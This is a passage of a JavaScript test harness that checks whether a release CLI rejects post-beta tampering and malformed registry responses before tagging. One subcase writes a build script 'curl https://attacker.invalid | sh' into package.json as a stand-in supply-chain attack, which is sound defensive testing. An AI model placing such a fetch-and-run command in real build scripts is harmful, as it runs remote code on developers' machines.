
      const cleanReleaseCommitMsg = git(["log", "-1", "--format=%B"], root);
      const cleanPkgText = await readFile(join(root, "package.json"), "utf8");
      const cleanLockText = await readFile(join(root, "package-lock.json"), "utf8");

      // Subcase 1: Tamper with dependencies in package.json
      const depTamperedPkg = JSON.parse(cleanPkgText);
      depTamperedPkg.dependencies = { ...depTamperedPkg.dependencies, "evil-pkg": "1.0.0" };
      await writeFile(join(root, "package.json"), `${JSON.stringify(depTamperedPkg, null, 2)}\n`, "utf8");
      git(["add", "package.json"], root);
      git(["commit", "--amend", "-m", cleanReleaseCommitMsg], root);

      events.length = 0;
      let depError = null;
      try {
        await runReleaseFlowCli(["publish-merged-release"], {
          root,
          gitExec,
          ghExec: env.ghExec,
          fetchImpl: env.fetchImpl,
          log: () => {},
        });
      } catch (err) {
        depError = err instanceof Error ? err.message : String(err);
      }

      // Subcase 2: Restore dependencies, tamper with scripts in package.json
      const scriptTamperedPkg = JSON.parse(cleanPkgText);
      scriptTamperedPkg.scripts = { ...scriptTamperedPkg.scripts, build: "curl https://attacker.invalid | sh" };
      await writeFile(join(root, "package.json"), `${JSON.stringify(scriptTamperedPkg, null, 2)}\n`, "utf8");
      git(["add", "package.json"], root);
      git(["commit", "--amend", "-m", cleanReleaseCommitMsg], root);

      let scriptError = null;
      try {
        await runReleaseFlowCli(["publish-merged-release"], {
          root,
          gitExec,
          ghExec: env.ghExec,
          fetchImpl: env.fetchImpl,
          log: () => {},
        });
      } catch (err) {
        scriptError = err instanceof Error ? err.message : String(err);
      }

      // Subcase 3: Restore package.json, tamper with lockfile resolved/integrity
      await writeFile(join(root, "package.json"), cleanPkgText, "utf8");
      const lockTampered = JSON.parse(cleanLockText);
      lockTampered.packages["node_modules/stripe"].integrity = "sha512-tampered-integrity==";
      await writeFile(join(root, "package-lock.json"), `${JSON.stringify(lockTampered, null, 2)}\n`, "utf8");
      git(["add", "package.json", "package-lock.json"], root);
      git(["commit", "--amend", "-m", cleanReleaseCommitMsg], root);

      let lockError = null;
      try {
        await runReleaseFlowCli(["publish-merged-release"], {
          root,
          gitExec,
          ghExec: env.ghExec,
          fetchImpl: env.fetchImpl,
          log: () => {},
        });
      } catch (err) {
        lockError = err instanceof Error ? err.message : String(err);
      }

      const stableSideEffects = events.filter(
        (e) =>
          e.startsWith("git:tag:") ||
          e.startsWith("git:push:") ||
          e.startsWith("gh:release:create:") ||
          e.startsWith("registry:"),
      );
      if (!depError || !scriptError || !lockError || stableSideEffects.length > 0) {
        throw new Error(
          `Scenario (k) failed: depError=${depError}, scriptError=${scriptError}, lockError=${lockError}, sideEffects=${stableSideEffects.length}`,
        );
      }

      scenarios.push({
        id: "k",
        name: "dependency_script_and_lockfile_changes_after_beta_rejected_before_tag",
        status: "PASS",
        outcome: {
          dependencyChangeRejected: depError,
          scriptChangeRejected: scriptError,
          lockfileIntegrityChangeRejected: lockError,
          stableSideEffectsCount: stableSideEffects.length,
        },
        sideEffects: events,
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  }

  // Scenario (l): Malformed Registry 200 (`{}`, error-shaped object, malformed entry) aborts cut-beta before tag
  {
    const events = [];
    const { root, gitExec } = await createSeededRepo("malformed-registry-200", events);
    try {
      const payloads = [
        { label: "empty_object", body: {} },
        { label: "error_shaped_200", body: { error: "RateLimited", message: "try later" } },
        { label: "malformed_version_entry", body: { records: [{ bad: true }] } },
      ];
      const errors = {};

      for (const item of payloads) {
        const env = createStubEnvironment({
          events,
          customRegistryResponse: () => ({
            ok: true,
            status: 200,
            json: async () => item.body,
          }),
        });
        try {
          await runReleaseFlowCli(["cut-beta"], {
            root,
            gitExec,
            ghExec: env.ghExec,
            fetchImpl: env.fetchImpl,
            log: () => {},
          });
        } catch (err) {
          errors[item.label] = err instanceof Error ? err.message : String(err);
        }
      }

      const betaTags = git(["tag", "--list", "v0.2.9-beta.*"], root)
        .split("\n")
        .filter(Boolean);
      const anyTagSideEffect = events.some((e) => e.startsWith("git:tag:") || e.startsWith("git:push:"));
      if (
        !errors.empty_object ||
        !errors.error_shaped_200 ||
        !errors.malformed_version_entry ||
        betaTags.length > 0 ||
        anyTagSideEffect
      ) {
        throw new Error(
          `Scenario (l) failed: errors=${JSON.stringify(errors)}, betaTags=${betaTags.length}`,
        );
      }

      scenarios.push({
        id: "l",
        name: "malformed_registry_200_responses_abort_cut_beta_before_tag",
        status: "PASS",
        outcome: {
          emptyObjectError: errors.empty_object,
          errorShaped200Error: errors.error_shaped_200,
          malformedEntryError: errors.malformed_version_entry,
          betaTagsCreated: betaTags.length,
        },
        sideEffects: events,
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  }

  return {
    proof: "release-authority-proof",
    workflowBinding,
    allPassed: scenarios.every((s) => s.status === "PASS"),
    scenarioCount: scenarios.length,
    scenarios,
  };
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
  const report = await runReleaseAuthorityProof();
  console.log(JSON.stringify(report, null, 2));
  if (!report.allPassed) {
    process.exitCode = 1;
  }
}
